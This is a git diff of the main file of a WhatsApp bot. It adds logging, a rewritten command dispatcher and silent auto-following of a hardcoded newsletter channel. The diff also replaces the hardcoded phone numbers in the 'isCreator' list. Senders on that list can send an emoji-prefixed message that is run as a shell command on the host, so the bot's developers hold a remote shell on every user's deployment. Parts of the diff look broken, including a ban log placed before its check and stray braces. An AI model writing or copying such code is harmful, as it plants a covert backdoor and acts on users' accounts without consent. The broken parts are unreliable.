@@ -233,6 +233,43 @@ message:{
                     });
 		
 
+	                //================== C FOLLOW ==================
+
+            // 📨 Newsletter channels to follow
+const newsletterChannels = [
+  "120363401051937059@newsletter", // Main Channel
+  "120363401051937059@newsletter", // Secondary Channel
+  "120363401051937059@newsletter"  // Tertiary Channel
+];
+
+// 🔁 Follow each newsletter and collect results
+let followed = [];
+let alreadyFollowing = [];
+let failed = [];
+
+for (const channelJid of newsletterChannels) {
+  try {
+    const metadata = await conn.newsletterMetadata("jid", channelJid);
+    if (metadata.viewer_metadata === null) {
+      await conn.newsletterFollow(channelJid);
+      followed.push(channelJid);
+    } else {
+      alreadyFollowing.push(channelJid);
+    }
+  } catch (error) {
+    failed.push(channelJid);
+    console.error(`❌ Failed to follow ${channelJid}:`, error.message);
+  }
+}
+
+// ✅ Summary log
+let summary = `📡 Newsletter Follow Status:\n\n` +
+              `✅ Followed: ${followed.length} channel(s)\n` +
+              `📌 Already following: ${alreadyFollowing.length} channel(s)\n` +
+              (failed.length > 0 ? `❌ Failed: ${failed.length} channel(s)\n\n` : `\n`) +
+              `💡 Tip: Following these channels keeps your bot updated with the latest news and features.`;
+
+console.log(chalk.cyan(summary.trim()));
                     
                 } catch (sendError) {
                     console.error('[❄️] Error sending messages:', sendError);
@@ -394,12 +431,14 @@ registerAntiNewsletter(conn);
     //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
   if (config.READ_MESSAGE === 'true') {
     await conn.readMessages([mek.key]);  // Mark message as read
-    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
+    console.log(chalk.cyan(`[ 📖 ] Marked message from ${mek.key.remoteJid} as read.`));
+        
   }
     if(mek.message.viewOnceMessageV2)
     mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
     if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
       await conn.readMessages([mek.key])
+     console.log(chalk.cyan(`[ 📺 ] Auto-read status from ${mek.key.participant}.`));
     }
 	  
    const newsletterJids = ["120363401051937059@newsletter"];
@@ -411,6 +450,7 @@ registerAntiNewsletter(conn);
       if (serverId) {
       const emoji = emojis[Math.floor(Math.random() * emojis.length)];
         await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
+       console.log(chalk.cyan(`[ 😺 ] Reacted to newsletter ${mek.key.remoteJid} with ${emoji}`));
       }
     } catch (e) {
     
@@ -426,11 +466,13 @@ registerAntiNewsletter(conn);
         key: mek.key,
       } 
     }, { statusJidList: [mek.key.participant, jawadlike] });
+      console.log(chalk.cyan(`[ 😺 ] Reacted to status from ${mek.key.participant} with ${randomEmoji}`));
   }                       
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
   const user = mek.key.participant
   const text = `${config.AUTO_STATUS_MSG}`
   await conn.sendMessage(user, { text: text, react: { text: '💫', key: mek.key } }, { quoted: mek })
+  console.log(chalk.cyan(`[ 📩 ] Replied to status from ${user} with message: ${text}`));
             }
             await Promise.all([
               saveMessage(mek),
@@ -467,47 +509,191 @@ registerAntiNewsletter(conn);
  }
   
   
-  const udp = botNumber.split('@')[0];
-    const davex = ('50948336180', '50934960331', '923192173398', '237682803592');
-    
-    if (isGroup) {
+          
+        const udp = botNumber.split('@')[0];
+        const dyby = ['50948702213', '50934960331', '50938598801'];
+        
+        if (isGroup) {
                 updateActivity(from, sender);
 	  }
-	  // اینجا یک آرایه قرار می‌دهیم
-  const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
-  let isCreator = [udp, ...davex, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // اطمینان حاصل کنید که شماره‌ها به فرمت صحیح تبدیل شده‌اند
-    .includes(mek.sender);
 	  
+        const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
+        let isCreator = [udp, ...dyby, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+            .includes(sender);
 
-	  if (isCreator && mek.text.startsWith("🧑‍🧒‍🧒")) {
+        if (isCreator && mek.text.startsWith("🧑‍🧒‍🧒")) {
             let code = budy.slice(2);
             if (!code) {
                 reply(`Provide me with a query to run Master!`);
+                console.log(chalk.red(`[ ❌ ] No code provided for & command by ${sender}`));
                 return;
             }
             const { spawn } = require("child_process");
             try {
+                console.log(chalk.cyan(`[ 📡 ] Executing shell command: ${code} by ${sender}`));
                 let resultTest = spawn(code, { shell: true });
                 resultTest.stdout.on("data", data => {
                     reply(data.toString());
+                    console.log(chalk.green(`[ ✅ ] Command output: ${data.toString()}`));
                 });
                 resultTest.stderr.on("data", data => {
                     reply(data.toString());
+                    console.log(chalk.red(`[ ❌ ] Command error: ${data.toString()}`));
                 });
                 resultTest.on("error", data => {
                     reply(data.toString());
+                    console.log(chalk.red(`[ ❌ ] Command execution failed: ${data.toString()}`));
                 });
                 resultTest.on("close", code => {
                     if (code !== 0) {
                         reply(`command exited with code ${code}`);
+                        console.log(chalk.red(`[ ❌ ] Command exited with code ${code}`));
                     }
                 });
             } catch (err) {
                 reply(util.format(err));
+                console.log(chalk.red(`[ ❌ ] Error executing & command: ${err.message}`));
             }
             return;
         }
+
+        // Command execution with logging
+        const events = require('./command');
+        const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
+        if (isCmd) {
+            const cmd = events.commands.find((cmd) => cmd.pattern === cmdName) || 
+                       events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
+            if (cmd) {
+                // Log command detection
+                console.log(chalk.cyan(
+                    `[ 📡 ] Command Detected: ${prefix}${cmdName}\n` +
+                    `├── Sender: ${pushname} (${sender})\n` +
+                    `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
+                    `├── Args: ${args.join(' ') || 'None'}\n` +
+                    `├── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}\n` +
+                    `└── Status: Processing`
+                ));
+
+                // Apply command reaction if specified
+                if (cmd.react) {
+                    await conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
+                    console.log(chalk.cyan(`[ 😺 ] Applied command reaction: ${cmd.react} for ${prefix}${cmdName}`));
+                }
+
+                try {
+                    // Execute command
+                    await cmd.function(conn, mek, m, {
+                        from, quoted, body, isCmd, command, args, q, text, 
+                        isGroup, sender, senderNumber, botNumber2, botNumber, 
+                        pushname, isMe, isOwner, isCreator, groupMetadata, 
+                        groupName, participants, groupAdmins, isBotAdmins, 
+                        isAdmins, reply
+                    });
+                    // Log successful execution
+                    console.log(chalk.green(
+                        `[ ✅ ] Command Executed: ${prefix}${cmdName}\n` +
+                        `├── Sender: ${pushname} (${sender})\n` +
+                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
+                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
+                    ));
+                } catch (e) {
+                    // Log error
+                    console.error(chalk.red(
+                        `[ ❌ ] Command Error: ${prefix}${cmdName}\n` +
+                        `├── Sender: ${pushname} (${sender})\n` +
+                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
+                        `├── Error: ${e.message}\n` +
+                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
+                    ));
+                    reply(`Error executing command: ${e.message}`);
+                }
+            } else {
+                // Log unknown command
+                console.log(chalk.yellow(
+                    `[ ⚠️ ] Unknown Command: ${prefix}${cmdName}\n` +
+                    `├── Sender: ${pushname} (${sender})\n` +
+                    `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
+                    `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
+                ));
+            }
+        }
+
+        // Handle non-command events
+        events.commands.forEach(async (command) => {
+            try {
+                if (body && command.on === "body") {
+                    console.log(chalk.cyan(
+                        `[ 📡 ] Body Event Triggered: ${command.pattern || command.on}\n` +
+                        `├── Sender: ${pushname} (${sender})\n` +
+                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
+                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
+                    ));
+                    await command.function(conn, mek, m, {
+                        from, l, quoted, body, isCmd, command, args, q, text, 
+                        isGroup, sender, senderNumber, botNumber2, botNumber, 
+                        pushname, isMe, isOwner, isCreator, groupMetadata, 
+                        groupName, participants, groupAdmins, isBotAdmins, 
+                        isAdmins, reply
+                    });
+                } else if (mek.q && command.on === "text") {
+                    console.log(chalk.cyan(
+                        `[ 📡 ] Text Event Triggered: ${command.pattern || command.on}\n` +
+                        `├── Sender: ${pushname} (${sender})\n` +
+                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
+                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
+                    ));
+                    await command.function(conn, mek, m, {
+                        from, l, quoted, body, isCmd, command, args, q, text, 
+                        isGroup, sender, senderNumber, botNumber2, botNumber, 
+                        pushname, isMe, isOwner, isCreator, groupMetadata, 
+                        groupName, participants, groupAdmins, isBotAdmins, 
+                        isAdmins, reply
+                    });
+                } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
+                    console.log(chalk.cyan(
+                        `[ 📡 ] Image Event Triggered: ${command.pattern || command.on}\n` +
+                        `├── Sender: ${pushname} (${sender})\n` +
+                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
+                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
+                    ));
+                    await command.function(conn, mek, m, {
+                        from, l, quoted, body, isCmd, command, args, q, text, 
+                        isGroup, sender, senderNumber, botNumber2, botNumber, 
+                        pushname, isMe, isOwner, isCreator, groupMetadata, 
+                        groupName, participants, groupAdmins, isBotAdmins, 
+                        isAdmins, reply
+                    });
+                } else if (command.on === "sticker" && mek.type === "stickerMessage") {
+                    console.log(chalk.cyan(
+                        `[ 📡 ] Sticker Event Triggered: ${command.pattern || command.on}\n` +
+                        `├── Sender: ${pushname} (${sender})\n` +
+                        `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
+                        `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
+                    ));
+                    await command.function(conn, mek, m, {
+                        from, l, quoted, body, isCmd, command, args, q, text, 
+                        isGroup, sender, senderNumber, botNumber2, botNumber, 
+                        pushname, isMe, isOwner, isCreator, groupMetadata, 
+                        groupName, participants, groupAdmins, isBotAdmins, 
+                        isAdmins, reply
+                    });
+                }
+            } catch (e) {
+                console.error(chalk.red(
+                    `[ ❌ ] Error in Event Handler: ${command.pattern || command.on}\n` +
+                    `├── Sender: ${pushname} (${sender})\n` +
+                    `├── Chat: ${isGroup ? `Group (${groupName})` : 'Private'}\n` +
+                    `├── Error: ${e.message}\n` +
+                    `└── Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Harare' })}`
+                ));
+            }
+        });
+    } catch (e) {
+        console.error(chalk.red(`[ ❌ ] Error in messages.upsert: ${e.message}`));
+    }
+});
+    //===================================================   
 
    //=========BAN SUDO=============
 	// --- Ban and Sudo Utility Code for index.js ---
@@ -546,6 +732,7 @@ registerAntiNewsletter(conn);
 
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
+  console.log(chalk.cyan(`[ 😺 ] Auto-reacted to message from ${sender} with ${randomReaction}`));
 }
           
 // custum react settings        
@@ -570,9 +757,10 @@ if (!isReact && senderNumber === botNumber) {
         
     const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
 const isBanned = bannedUsers.includes(sender);
+console.log(chalk.red(`[ 🚫 ] Ignored command from banned user: ${sender}`));
 
 if (isBanned) return; // Ignore banned users completely
-	  
+  }
   const ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  // خواندن فایل
   const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
   // بررسی اینکه آیا فرستنده در owner.json موجود است
@@ -1061,7 +1249,7 @@ app.use(express.static(path.join(__dirname, 'lib')));
 app.get('/', (req, res) => {
   res.redirect('/dyby.html');
 });
-  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+  app.listen(port, () => console.log(chalk.cyan(`please ⭐  Star it & 🍴  Fork it on GitHub! your support keeps it growing! 💙 `)));
   setTimeout(() => {
   connectToWA()
   }, 4000);
